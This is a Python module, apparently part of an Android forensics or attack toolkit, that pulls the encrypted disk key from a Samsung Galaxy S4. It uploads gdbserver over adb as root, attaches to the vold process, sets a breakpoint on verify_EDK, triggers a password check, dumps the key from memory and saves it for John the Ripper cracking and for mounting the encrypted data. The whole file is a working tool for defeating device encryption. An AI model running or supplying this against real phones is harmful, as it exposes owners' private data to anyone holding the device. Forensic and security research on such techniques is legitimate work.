from adb.adb import ADB
import re
import sys
import string
import printer
import ConfigParser
from collections import namedtuple
from binascii import *
from sandutils import *
import os
import subprocess
import shlex
import threading
import pexpect


class SandS4GetEDK:


   def __init__(self, printer, config, project, adb_path="adb"):
      self.printer=printer
      self.config=config
      self.project=project
      self.params={"adbpath":{"description":"Path of the adb command",
			      "value":adb_path,
			      "required":True
			      },
		  "phonewithos":{"description":"The samsung hardware and the android version",
			      "value":"GT-I9505 4.3.2",
			      "required":True
			      },
		  "out_dir":{"description":"Where to generate the results and download files on the computer.",
			      "value":"results",
			      "required":True
			      },
		  }
      self.setparams(self.params)

   def setparams(self, params):
      self.params=params
      self.adb = ADB(self.params["adbpath"]["value"])
      self.phone = self.params["phonewithos"]["value"]
      self.out_dir = self.params["out_dir"]["value"]

   def getparams(self):
      return self.params

   def downloadforgdb(self,fullpath):
      
      """
      Downloads the fullpath for gdb. It puts the file in lib or in bin,
      Depends on the fullpath is a lib directory or not.
      """

      path, filename = os.path.split(fullpath)
      if(path.find("lib")!=-1):
         out=self.adb.get_remote_file(fullpath, "recovery/s4/system/lib/%s" % (filename))
      else:
         out=self.adb.get_remote_file(fullpath, "recovery/s4/system/bin/%s" % (filename))
      return out

   def write2john(self,edk):

      """
      Simple save the edk into the prject_sanddek.jtr file to jonh the ripper
      cracking
      """

      self.printer.print_info("This will be written to file %s/%s_sanddek.jtr, for jtr:" % (self.out_dir, self.project))
      self.printer.print_ok("%s_s4:%s" % (self.project, edk))
      try:
	 f= open("%s/%s_sanddek.jtr" % (self.out_dir, self.project), "a")
	 f.write("%s_s4:%s\n" % (self.project,  edk))
	 f.close()
      except IOError as e:
	 self.printer.print_err("I/O error({0}): {1}: {2}/{3}_sanddek.jtr".format(e.errno, e.strerror, self.out_dir, self.project))
	 return -1

   def write2footer(self,edk):

      """
      Save the EDK to a footer file. The we can use the mount modules, that
      uses the password
      """

      self.printer.print_info("Footer will be created: %s/%s_footer" % (self.out_dir, self.project))
      footer='\0'*0x84+unhexlify(edk)
      try:
	 f= open("%s/%s_footer" % (self.out_dir, self.project), "wb")
	 f.write(footer)
	 f.close()
      except IOError as e:
	 self.printer.print_err("I/O error({0}): {1}: {2}/{3}_footer".format(e.errno, e.strerror, self.out_dir, self.project))
	 return -1

   def cleanup(self, gdb=None, gdbserver=None):
      
      """
      Tries to gently stop gdb, kill gdbserver and delete it from /data/local/tmp or /tmp
      """
      
      if(gdb):
	 gdb.sendcontrol('c')
	 gdb.sendline("detach")
	 gdb.sendline("quit")
	 gdb.kill(0)
      if(gdbserver):
	 gdbserver.kill()
   
      self.adb.shell_command("rm /data/local/tmp/gdbserver")
      self.adb.shell_command("rm /tmp/gdbserver")
   

   def getedk(self):

      """
      Write the the help of the gdb and gdbserver, gets out the EDK on a S4.
      It puts a breakpoint on verify_EDK which is called when vdc cryptfs verifypw
      is called. The R0 register contains the EDK>
      """

      state=checkcryptostate(self.adb)
      if(state==""):
	 self.printer.print_err("The phone is not encrypted. ro.crypto.state is empty!")
	 return -1
      self.printer.print_debug("Check for su!")
      su=checkforsu(self.adb)
      if (su==""):
	 self.printer.print_err("The su comand was not found, hope adb have immediate root access!")
	 su=""
      
      self.printer.print_info("Downloading vold and libsec_km.so for gdb...")
      out=self.downloadforgdb("/system/bin/vold")
      if(out==None):
	 self.printer.print_err("Could not download vold! Exiting...")
	 return -1
      out=self.downloadforgdb("/system/lib/libsec_km.so")
      if(out==None):
	 self.printer.print_err("Could not download libsec_km.so! Exiting...")
	 return -1
      self.printer.print_ok("Download - Done")

      self.printer.print_debug("Check the destination directory!")
      dest_dir=""
      out=self.adb.shell_command(su+"ls /tmp")
      if (out.find("No such file or directory")!=-1):
	 self.printer.print_err("The /tmp directory was not found! We try the /data/local/tmp directory!")
	 out=self.adb.shell_command(su+"ls /data/local/tmp")
	 #if the directory empty, we will receive NoneType
	 if (out):
	    if (out.find("No such file or directory")!=-1):
	       self.printer.print_err("The /data/local/tmp directory was not found!")
	       self.printer.print_err("We did not found suitable destination directory! Please start the phone with the right recovery.")
	       return -1
	 dest_dir="/data/local/tmp"
      else:
	 dest_dir="/tmp"
      self.printer.print_debug("Use %s on the phone as a detination directory!" % dest_dir)
      
      self.printer.print_info("Uploading the gdb server...")
      push=self.adb.push_local_file("gdb/gdbserver","%s" % dest_dir)
      if(push.find("bytes")==-1):
	 self.printer.print_err("Could not upload the gdb server: %s" % push)
	 return -1
      self.printer.print_ok("Upload - Done")      

      self.print_info_adb(push.rstrip('\n'))
      self.printer.print_info("Staring gdbserver to listen on port 23946...")
      command="%s shell %s%s/gdbserver --multi :23946" % (self.adb.get_adb_path(),su,dest_dir)
      popen_args=shlex.split(command)
      self.printer.print_debug(command)
      gdbserver=subprocess.Popen(popen_args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      out=gdbserver.stdout.read(10)
      if(out.find("Listen")==-1):
	 self.printer.print_err("Could not start the gdbserver:")
	 self.printer.print_err("%s" % out.replace("\r\n","\\r\\n"))
	 self.printer.print_err("Cleaning up! You should check the %s directory on the phone!" % (dest_dir))
	 self.cleanup()
	 return -1
      
      self.printer.print_debug("Forwarding tcp socket for gdbserver...")
      out=self.adb.forward_socket("tcp:23946","tcp:23946")
      #out=self.adb.forward_socket("tcp:4446","tcp:4446")
      if(out):
	 self.printer.print_err("Could not bind on 127.0.0.1:23946! Cleaning up! You should check the %s directory on the phone!" % (dest_dir))
	 self.cleanup(gdbserver=gdbserver)
	 return -1
      
      self.printer.print_ok("Server start - Done")
      self.printer.print_info("Starting gdb...") 
      #gdb=pexpect.spawn("gdb/gdb", logfile=sys.stdout)
      gdb=pexpect.spawn("gdb/gdb")
      gdb.sendline("target extended-remote :23946")
      ret=gdb.expect(["Remote.*",".*Operation.*", ".*Ignoring.*", pexpect.TIMEOUT])
      if(ret!=0):
	 self.printer.print_err("Could not connect to gdb server! Cleaning up! You should check the %s directory on the phone!" % (dest_dir))
	 self.cleanup(gdb=gdb, gdbserver=gdbserver)
	 return -1
      self.printer.print_ok("gdb connected - Done")
      
      gdb.sendline("file recovery/s4/system/bin/vold") 
      ret=gdb.expect(["Reading.*",".*No such.*", pexpect.TIMEOUT])
      if(ret!=0):
	 self.printer.print_err("We need the vold executable from the phone! Cleaning up! You should check the %s directory on the phone!" % (dest_dir))
	 self.cleanup(gdb=gdb, gdbserver=gdbserver)
	 return -1
      self.printer.print_debug("We sent the file command")
      
      gdb.sendline("set solib-search-path recovery/s4/system/lib/")

      ps=self.adb.shell_command("su -c ps")
      for process in ps.splitlines():
	 if(process.rfind("vold") != -1 ):
	    process=re.sub("\s+", ' ' , process)	
	    self.voldpid=process.split(' ')[1]
      self.printer.print_ok("Found vold process id: %s!" % self.voldpid)
     
      gdb.sendline("attach %s" % (self.voldpid))
      ret=gdb.expect(["0x.*",".*to process.*", pexpect.TIMEOUT])
      if(ret!=0):
	 self.printer.print_err("Could not attach to the vold process: %s! Cleaning up! You should check the %s directory on the phone!" % (self.voldpid, dest_dir))
	 self.cleanup(gdb=gdb, gdbserver=gdbserver)
	 return -1
      self.printer.print_ok("Attached vold process: %s!" % self.voldpid)
      
      gdb.sendline("info threads")
      gdb.expect("  4")
      thread4=gdb.readline().split(' ')[5].split('.')[1]
      #Read the rests
      for i in xrange(3):
	 gdb.readline()
      gdb.sendline("detach")
      gdb.sendline("attach %s" % (thread4))
      ret=gdb.expect(["0x.*",".*to process.*", pexpect.TIMEOUT])
      if(ret!=0):
	 self.printer.print_err("Could not attach to the vold thread: %s! Cleaning up! You should check the %s directory on the phone!" % (thread4, dest_dir))
	 self.cleanup(gdb=gdb, gdbserver=gdbserver)
	 return -1
      self.printer.print_ok("Attached vold thread: %s!" % thread4)
      
      gdb.sendline("break verify_EDK")
      ret=gdb.expect([".*Breakpoint.*",".*pending.*"])
      if(ret!=0):
	 self.printer.print_err("Could not set breakpoint on the verify_EDK function! Cleaning up! You should check the %s directory on the phone!")
	 gdb.sendline("n")
	 self.cleanup(gdb=gdb, gdbserver=gdbserver)
	 return -1
      self.printer.print_debug("Breakpoint was set on the verify_EDK function.")
      
      self.printer.print_debug("Staring vdc:")
      command="%s shell %s vdc cryptfs verifypw 1234" % (self.adb.get_adb_path(),su)
      popen_args=shlex.split(command)
      self.printer.print_debug(command)
      vdc=subprocess.Popen(popen_args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      out=vdc.stdout.read(15)
      if(out.find("command cryptfs")==-1):
	 self.printer.print_err("Could not start vdc: %s" % (out))
	 self.printer.print_err(" Cleaning up! You should check the %s directory on the phone!" % (dest_dir))
	 self.cleanup(gdb=gdb, gdbserver=gdbserver)
	 return -1
      
      gdb.sendline("c")
      ret=gdb.expect(".*Breakpoint.*")
      self.printer.print_debug("Breakpoint hit! Let's investigate the first parameter (r0)!")
      gdb.sendline("x /80bx $r0+32")
      gdb.expect(":")
      hex_list=[]
      for i in range(0,10):
	 if(i==0):
	    line=gdb.before+gdb.readline()
	 else:
	    line=gdb.readline()
	 hex_line=''.join(line.split("\t")[1:]).replace("0x","").rstrip("\r\n").upper()
	 hex_list.append(hex_line)
       
      self.write2john(''.join(hex_list))
      self.write2footer(''.join(hex_list))
      
      self.cleanup(gdb=gdb, gdbserver=gdbserver)
   
      return 1
   
   def print_info_adb(self,message, ok=True):
      if(ok):
	 self.printer.printer.print_debug("OK! Received the following from adb: %s" %message)
      else:
	 self.printer.print_error("ERROR! Received the following from adb: %s" %message)
